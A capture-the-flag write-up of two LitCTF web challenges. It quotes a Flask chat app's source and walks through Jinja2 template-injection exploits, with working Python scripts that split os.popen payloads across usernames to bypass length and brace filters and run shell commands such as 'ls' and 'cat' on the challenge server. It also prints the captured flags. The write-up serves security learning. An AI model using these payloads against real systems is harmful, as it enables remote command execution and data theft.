---
title: Group Chat
summary: Minimalistic chat room for ones who strive for simplicity.
tags: [LitCTF, Web, SSTI]
date: 2025-08-25
showtoc: true
---

# Group Chat

## Description

Minimalistic chat room for ones who strive for simplicity.
Currently in alpha so for now, refresh for other people's messages.

Author: hihitherethere

[Given files](/litctf/group-chat/main.py)

## Solution

As expected, the application is a simple group chat.

It has several endpoints:
* `/`: The page displaying the group chat messages.
* `/set_username`: Where users register before sending messages.
* `/send_message`: The endpoint to send a message.

![chat](/litctf/group-chat/chat.png)

Since the app runs on a Flask server, my first attempt was to test for a basic Server-Side Template Injection (SSTI) by submitting `{{7*7}}` as either a username or message.
However, both attempts were blocked.

Diving deeper into the source code revealed that SSTI was indeed possible, but there were security measures in place to prevent trivial exploitation.

```python
@app.route("/")
def index():
    if "username" not in session:
        return redirect(url_for("set_username"))
    html = (
        """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat Room</title>
</head>
<body>
    <script>
    function check(event) {
        const regex = /^[a-zA-Z0-9]*$/;
        const char = String.fromCharCode(event.keyCode);
        if (!regex.test(char) && event.key !== "Backspace" && event.key !== "Delete") {
            event.preventDefault();
        }
    }
    </script>
    <h2>Chat Room</h2>
    <div id="chat-box">"""
        + "<br>".join(chat_logs)
        + """
    </div>
    <form action="/send_message" method="POST">
        <input type="text" onkeydown="check(event)" name="message" placeholder="Type a message" required>
        <button type="submit">Send</button>
    </form>
</body>
</html>
"""
    )
    return render_template_string(html)
```

Let's analyze what stopped my initial SSTI attempts.

```python
@app.route("/send_message", methods=["POST"])
def send_message():
    if "username" not in session:
        return redirect(url_for("set_username"))
    msg = request.form["message"]
    username = session.get("username", "Guest")
    if not msg.isalnum():
        return redirect(url_for("index"))
    chat_message = username + ": " + msg
    chat_logs.append(chat_message)

    return redirect(url_for("index"))
```

Messages are only accepted if they contain alphanumeric characters (`^[a-zA-Z0-9]+$`).
Since SSTI delimiters (`{{` and `}}`) are non-alphanumeric, the payloads get rejected.

Similarly, the username input is restricted:

```python
@app.route("/set_username", methods=["GET", "POST"])
def set_username():
    if request.method == "POST":
        if len(request.form["username"]) > 1000:
            return redirect(url_for("set_username"))
        if request.form["username"].count("{") and request.form["username"].count("}"):
            return redirect(url_for("set_username"))
        session["username"] = request.form["username"]
        return redirect(url_for("index"))
```

Usernames must be shorter than 1000 characters and cannot contain both `{` and `}` simultaneously.

This raised an interesting idea: What if I split the SSTI payload between two usernames?
The first username could start the SSTI expression with `{{`, and the second username could close it with `}}`.

To do that, we need to bypass the `: [MESSAGE]` separator between the two usernames.

```python
chat_message = username + ": " + msg
chat_logs.append(chat_message)
```

The key insight is to use SSTI to execute a Bash command, then comment out the rest of the input to avoid syntax errors, essentially running:

```sh
ls # : [MESSAGE]
```

To automate this, I wrote a Python script to execute arbitrary Bash commands on the vulnerable server by setting two usernames and sending a benign message:

```python
import requests
import sys

URL = "http://localhost:5000"
COMMAND = sys.argv[1]

# {{config.__class__.__init__.__globals__['os'].popen('COMMAND # : MESSAGE').read()}}
PAYLOAD_1 = "{{config.__class__.__init__.__globals__['os'].popen('" + COMMAND + " # "
PAYLOAD_2 = "').read()}}"

def set_username(username):
    session = requests.Session()
    session.post(URL + "/set_username", data={"username": username})
    return session.cookies["session"]

def send_message(cookie):
    session = requests.Session()
    session.cookies["session"] = cookie
    r = session.post(URL + "/send_message", data={"message": "hello"})
    return r

cookie1 = set_username(PAYLOAD_1)
cookie2 = set_username(PAYLOAD_2)

send_message(cookie1)
send_message(cookie2)
```

After successfully running an `ls` command, I spotted the `flag.txt` file and used the same method to read its contents with `cat`.

![flag](/litctf/group-chat/flag.png)

```
LITCTF{1m_g0nn4_h4v3_t0_d0_m0r3_t0_5t0p_7he_1n3v1t4bl3_f0rw4rd_br4c3_f0rw4rd_br4c3_b4ckw4rd_br4c3_b4ckw4rd_br4c3}
```

---

# Group Chat 2

## Description

Usernames have been shortened to prevent spam on the website.

Author: hihitherethere

[Given files](/litctf/group-chat2/main.py)

## Solution

At first glance, the application looks very similar to the previous version.

Even the code is mostly unchanged.
To identify what was modified, I ran a `diff`:

```diff
<         if len(request.form["username"]) > 1000:
---
>         if len(request.form["username"]) > 14:
```

It turns out the only difference is the username length limit, now restricted to 14 characters instead of 1000.

This means the same SSTI vulnerability can be exploited, but with usernames limited to 14 characters, I will need more than two usernames this time to split the payload.

My approach is to use SSTI with square bracket notation and string slicing to remove the non-controllable characters.

The base SSTI payload I used is the following:

```python
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
```

The challenge comes from the non-controllable characters inserted by the application:

* `: `: the delimiter between the username and the message.
* `<br>`: the delimiter between consecutive messages.

For example, the rendered chat looks like this:

```html
username1: message1<br>username2: message2<br>username3: message3
```

The hardest part was figuring out how to slice the strings correctly to fit each username into the 14-character limit while bypassing these delimiters.

The final SSTI payload (including the non-controllable characters) looks like this:

```python
{{request[': application<br>'[2:13]][': msg<br>__globals__: msg<br>'[9:20]][': msg<br>__builtins__: msg<br>'[9:21]][': msg<br>__import__: msg<br>'[9:19]](': os<br>'[2:4])[': popen<br>'[2:7]](': cat<br>'[2:5]+' * #: msg<br>')[': read<br>'[2:6]]()}}: msg<br>
```

I adapted my previous Python script to:
* Validate all restrictions on usernames and messages.
* Handle multiple usernames and messages to piece together the full payload.

Here is the updated script:

```python
import requests

URL = "http://localhost:5000"
USERNAME_SIZE = 14
USERNAME_DEL = ": "
MESSAGE_DEL = "<br>"

PAYLOADS = [
    "{{request['" + USERNAME_DEL,
    "application" + MESSAGE_DEL,
    "'[2:13]]['" + USERNAME_DEL,
    "msg" + MESSAGE_DEL,
    "__globals__" + USERNAME_DEL,
    "msg" + MESSAGE_DEL,
    "'[9:20]]['" + USERNAME_DEL,
    "msg" + MESSAGE_DEL,
    "__builtins__" + USERNAME_DEL,
    "msg" + MESSAGE_DEL,
    "'[9:21]]['" + USERNAME_DEL,
    "msg" + MESSAGE_DEL,
    "__import__" + USERNAME_DEL,
    "msg" + MESSAGE_DEL,
    "'[9:19]]('" + USERNAME_DEL,
    "os" + MESSAGE_DEL,
    "'[2:4])['" + USERNAME_DEL,
    "popen" + MESSAGE_DEL,
    "'[2:7]]('" + USERNAME_DEL,
    "cat" + MESSAGE_DEL,
    "'[2:5]+' * #" + USERNAME_DEL,
    "msg" + MESSAGE_DEL,
    "')['" + USERNAME_DEL,
    "read" + MESSAGE_DEL,
    "'[2:6]]()}}" + USERNAME_DEL,
    "msg" + MESSAGE_DEL,
]

# Validate the restrictions
for i in range(len(PAYLOADS)):
    if i % 2 == 0:
        assert PAYLOADS[i].endswith(
            USERNAME_DEL
        ), f"Username {i} should end with delimiter"
        PAYLOADS[i] = PAYLOADS[i][:-len(USERNAME_DEL)]  # Remove delimiter
        assert len(PAYLOADS[i]) <= USERNAME_SIZE, f"Username {i} must be ≤ 14 characters"
    else:
        assert PAYLOADS[i].endswith(
            MESSAGE_DEL
        ), f"Message {i} should end with delimiter"
        PAYLOADS[i] = PAYLOADS[i][:-len(MESSAGE_DEL)]  # Remove delimiter
        assert PAYLOADS[i].isalnum(), f"Message {i} must be alphanumeric"


def set_username(username):
    session = requests.Session()
    session.post(URL + "/set_username", data={"username": username})
    return session.cookies["session"]


def send_message(message, cookie):
    session = requests.Session()
    session.cookies["session"] = cookie
    r = session.post(URL + "/send_message", data={"message": message})
    return r


for i in range(0, len(PAYLOADS), 2):
    username = PAYLOADS[i]
    message = PAYLOADS[i + 1]

    cookie = set_username(username)
    send_message(message, cookie)
```

After several attempts and fine-tuning the payload, I successfully executed the SSTI and ran `cat *` to reveal the flag:

![flag](/litctf/group-chat2/flag.png)

```
LITCTF{c4n7_y0u_b3l13v3_us3rn4m35_c0uld_b3_1000_ch4r5_10ng_b3f0r3??}
```

# References

- Payloads All The Things: [Server Side Template Injection - Python](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#jinja2)
- Exploit Notes: [Flask Jinja2 Pentesting](https://exploit-notes.hdks.org/exploit/web/framework/flask-jinja2/)
